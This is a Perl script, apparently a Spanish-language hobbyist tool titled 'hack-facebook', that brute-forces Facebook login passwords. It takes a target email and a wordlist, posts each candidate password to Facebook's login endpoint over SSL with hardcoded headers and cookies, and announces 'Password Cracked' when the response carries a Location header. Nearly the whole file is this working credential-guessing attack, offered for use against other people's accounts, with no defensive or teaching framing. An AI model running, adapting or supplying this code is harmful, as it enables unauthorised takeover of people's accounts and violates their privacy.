#!/usr/bin/perl
#!/usr/bin/perl -w
package person; #borrar despues
use strict;
use Net::SSLeay::Handle;


#borrar despues_______
use IO::Socket::INET;
use IO::Socket::SSL;
use Getopt::Long;
use Config;
#ftp .plx
use warnings;
use strict;
use Net::FTP;
use Carp;
#borrar despues______

#
#
#
#SI VAS A AGREGAR MAS PALABRAS LAS QUE QUIERAS SOLO AGREGA AQUI ABAJO DESPUES DE [4], PON ( && $ARGV[5]) ETC. OMAR JONAX9872
if(!defined($ARGV[0] && $ARGV[1] && $ARGV[2] && $ARGV[3] && $ARGV[4] && $ARGV[5])) {
#OJO DESPUES DE QUE AGREGUES MAS PALABRAS DEBERAS MODIFICAR MAS ABAJO DONDE APARECE OTRA VEZ LOS #
#
#


if(!defined($ARGV[0] && $ARGV[1])) {

system('clear');
print " \033[1;34m                             FACEBOOK \n";
print " \033[9;32m                                         \n";
print " \033[9;32m              ░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ \n";
print " \033[9;32m             ▓███████████████████████████\n";
print " \033[9;32m             ███\033[9;37mAutor:Luishiño Pericena\033[9;32m██\n";
print " \033[9;32m             ███\033[9;37m     choque            \033[9;32m██\n";
print " \033[9;32m             ███\033[9;31m    hack-facebook      \033[9;32m██\n";
print " \033[9;33m  ░▓██▓███▓▓▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m██       ███\n";
print " \033[9;33m ▓███████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m█       ███\n";
print " \033[9;33m ██    Optiones:           ▓▓▓▓\033[9;32m█      ███\n";
print " \033[9;33m ▓█▓1.-correo electronico   ▓▓▓\033[9;32m█      ███\n";
print " \033[9;33m ▓█▓2.-diccionario.txt      ▓▓▓\033[9;32m█      ███\n";
print " \033[9;33m ▓█▓3.-Escribir 4 palabras▓▓▓▓▓\033[9;32m█      ███\n";
print " \033[9;33m ▓█▓Password                 ▓▓\033[9;32m████   ▓▒ \n";
print " \033[9;33m ▓█▓                        ▓▓█▒ ▒\033[9;32m█  ███   \n";
print " \033[9;33m ▓█        ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓   ▒\033[9;32m ███   \n";
print " \033[9;33m ▓██▓▓▓▓▓▓▓▓▓████████████████▓       ▒   \n";
print " \033[9;33m ░███▓▓▓▓▓███████████████████░           \n";
print " \033[9;33m   ░▒█▓▓████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒             \n";
print " \033[9;33m    ░█████▒                              \n";
print " \033[9;33m    ░██▓▒                                \n";
print " \033[9;33m    ░█░                                      \n";                                      
print " \033[9;34m    ░████▓                            ░▓█▓                            ▓█▓  \n";                 
print " \033[9;34m    ███▓▓░                            ▒███                           ░███      \n";             
print " \033[9;34m    ███                               ▒██▓                           ░███         \n";          
print " \033[9;34m  ███████░▒██████░  ▒██████░ ▒██████░ ░████████░  ▓██████░  ▒██████▒  ███  ▓███      \n";       
print " \033[9;34m  ▒▓███▓▓ ░▓▒▒▓███ ▒███▒▒▓▓ ▒██▓  ███  ███▒▒▓███ ███▓▒▓███ ▒███▒▒███░ ██▓ ▓██▓       \n";       
print " \033[9;34m    ███       ░███ ▓██░     ▓██▓▓▒███░ ██▓   ███ ███   ▓██ ▒██▒  ░██▓ ██▓▓██▒         \n";      
print " \033[9;34m    ███  ▒████████ ▓██░     ▓██▓▒▒▒▒▒ ░██▓   ███ ███   ▓██ ▒██▒  ░██▓ ██▓▓██▒          \n";     
print " \033[9;34m    ███  ███▓ ░███ ▒██▓░░▒▓ ▒██▓    ▒ ░███░░▓███ ███▓░▒███ ▒███░░███▒ ██▓ ▓██▓   ░     \n";     
print " \033[9;34m    ███  ░████████  ▒██████▒ ▒███████ ░███████▓   ▓██████░  ▒██████▓ ░███  ▓███ ▓█░    \n";             
print " \033[9;34m    ▒▓  ░█▓ ░▒░  ░▓ ░ ▒▒░▒░░▓▓▓░   ▒▒▒▓▒▒ ░▒░  ░▓▒▒░  ░▓  ▓▒▒░  ░▒ ▒▒▒    ░       \n";               
print " \033[9;34m      ░▓▒▓▒▒▓▒▒░█░  ▒▓ ▓▒█▓▓█ ▓█░▒▓▒▓ ▒▒ ▓▒▓▒▒█░▓▓▒▓ ▓▓█ ░▓ ░▒ █░▓▓▒█░▓▓▓░            \n";              
print " \033[9;34m                                  ░                       ░       ░▒           \n";
print "\033[1;30m.........................................................................................\n";
print "\033[1;31m==========================================================================================\n";
print "\033[1;30mUsage: perl $0
\033[1;33mEmail diccionario.txt \033[1;32mpalabra1 palabra2 palabra3 palabra4 \033[1;31m\n";
#=========================================================================================\n\n\n\n\n\n\n\n\n";
exit; }

my $user = $ARGV[0];
my $diccionario = $ARGV[1];




#####################################################################################
#
#
#EN ESTA PARTE PUEDES MODIFICAR SI DESEAS AGREGAR MAS PALABRAS 
# my $primera = $ARGV[2];
# my $segunda = $ARGV[3];
# my $tercera = $ARGV[4];
# my $cuarta = $ARGV[5];
# open(MIFICH,">>diccionario.txt")|| die "lo siento, no puedo crear fichero.txt\n";   
# print MIFICH "\n$primera\n$segunda\n$tercera\n$cuarta";
# close(MIFICH);
#
#
#
#

#########################################################3#############################


open (LIST, $diccionario) || die "\n[-] Can't find/open $diccionario\n";
print " \033[1;34m                             FACEBOOK \n";
print " \033[9;32m                                         \n";
print " \033[9;32m              ░▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒ \n";
print " \033[9;32m             ▓███████████████████████████\n";
print " \033[9;32m             ████████████████████████████\n";
print " \033[9;32m             ████████████████████████████\n";
print " \033[9;32m             ████████████████████████████\n";
print " \033[9;33m  ░▓██▓███▓▓▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m████████████\n";
print " \033[9;33m ▓███████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m███████████\n";
print " \033[9;33m ██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m███████████\n";
print " \033[9;33m ▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m███████████\n";
print " \033[9;33m ▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m███████████\n";
print " \033[9;33m ▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m███████████\n";
print " \033[9;33m ▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\033[9;32m███████▓▒ \n";
print " \033[9;33m ▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▒ ▒\033[9;32m██████   \n";
print " \033[9;33m ▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓   ▒\033[9;32m████   \n";
print " \033[9;33m ▓██▓▓▓▓▓▓▓▓▓████████████████▓       ▒   \n";
print " \033[9;33m ░███▓▓▓▓▓███████████████████░           \n";
print " \033[9;33m   ░▒█▓▓████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒             \n";
print " \033[9;33m    ░█████▒                              \n";
print " \033[9;33m    ░██▓▒                                \n";
print " \033[9;33m    ░█░                                      \n";                                      
print " \033[9;34m    ░████▓                            ░▓█▓                            ▓█▓  \n";                 
print " \033[9;34m    ███▓▓░                            ▒███                           ░███      \n";             
print " \033[9;34m    ███                               ▒██▓                           ░███         \n";          
print " \033[9;34m  ███████░▒██████░  ▒██████░ ▒██████░ ░████████░  ▓██████░  ▒██████▒  ███  ▓███      \n";       
print " \033[9;34m  ▒▓███▓▓ ░▓▒▒▓███ ▒███▒▒▓▓ ▒██▓  ███  ███▒▒▓███ ███▓▒▓███ ▒███▒▒███░ ██▓ ▓██▓       \n";       
print " \033[9;34m    ███       ░███ ▓██░     ▓██▓▓▒███░ ██▓   ███ ███   ▓██ ▒██▒  ░██▓ ██▓▓██▒         \n";      
print " \033[9;34m    ███  ▒████████ ▓██░     ▓██▓▒▒▒▒▒ ░██▓   ███ ███   ▓██ ▒██▒  ░██▓ ██▓▓██▒          \n";     
print " \033[9;34m    ███  ███▓ ░███ ▒██▓░░▒▓ ▒██▓    ▒ ░███░░▓███ ███▓░▒███ ▒███░░███▒ ██▓ ▓██▓   ░     \n";     
print " \033[9;34m    ███  ░████████  ▒██████▒ ▒███████ ░███████▓   ▓██████░  ▒██████▓ ░███  ▓███ ▓█░    \n";                
print " \033[9;34m       ▒▓  ░█▓ ░▒░  ░▓ ░ ▒▒░▒░░▓▓▓░   ▒▒▒▓▒▒ ░▒░  ░▓▒▒░  ░▓  ▓▒▒░  ░▒ ▒▒▒    ░       \n";               
print " \033[9;34m      ░▓▒▓▒▒▓▒▒░█░  ▒▓ ▓▒█▓▓█ ▓█░▒▓▒▓ ▒▒ ▓▒▓▒▒█░▓▓▒▓ ▓▓█ ░▓ ░▒ █░▓▓▒█░▓▓▓░            \n";              
print " \033[9;34m                                  ░                       ░       ░▒           \n";
print "\033[1;30m.........................................................................................\n";
print "\033[1;31m          ======================================================\n";
print "\033[1;37m                                 FACEBOOK:                  \n";
print "\033[1;37m                	 https://www.facebook.com              \n";
print "\033[1;32m                    Autor :  [[LUISHIÑO PERICENA CHOQUE]]                 \n";
print "\033[1;31m         ========================================================\n";
print "\033[1;31m\n          [+] \033[1;37mUsuario o Correo : \033[1;33m$user ...\n\n";
print "\033[1;31m=========================================================================================\n";
print "\033[1;31m| [%] |Estado      Usuario              Contraseña                                      |\n";
print "\033[1;31m=========================================================================================\n";

while (my $password = <LIST>) {
chomp ($password);
$password =~ s/([^^A-Za-z0-9\-_.!~*'()%@ ])/ sprintf "%%%0x", ord $1 /eg;

my $a = "POST /login.php HTTP/1.1";
my $b = "Host: www.facebook.com";
my $c = "Connection: close";
my $e = "Cache-Control: max-age=0";
my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
my $g = "Origin: https://www.facebook.com";
my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
my $i = "Content-Type: application/x-www-form-urlencoded";
my $j = "Accept-Encoding: gzip,deflate,sdch";
my $k = "Accept-Language: en-US,en;q=0.8";
my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$password&default_persistent=0&login=Log+In";
my $cl = length($post);
my $d = "Content-Length: $cl";


my ($host, $port) = ("www.facebook.com", 443);

tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

print SSL "$a\n";
print SSL "$b\n";
print SSL "$c\n";
print SSL "$d\n";
print SSL "$e\n";
print SSL "$f\n";
print SSL "$g\n";
print SSL "$h\n";
print SSL "$i\n";
print SSL "$j\n";
print SSL "$k\n";
print SSL "$l\n";
print SSL "$cookie\n\n";

print SSL "$post\n";

my $success;
while(my $result = <SSL>){
if($result =~ /Location(.*?)/){
$success = $1;
}
}
if (!defined $success)
{

print "\033[1;31m| [-] |\033[1;31mError   \033[1;37m$user      \033[1;33m$password     \n";
close SSL;
}
else
{
print "\033[1;32m\n########################################################\n";
print "\033[1;32m[+] Password Cracked: \033[1;34m$password\n";
print "\033[1;32m########################################################\n\n";
close SSL;
exit;
}
}
}
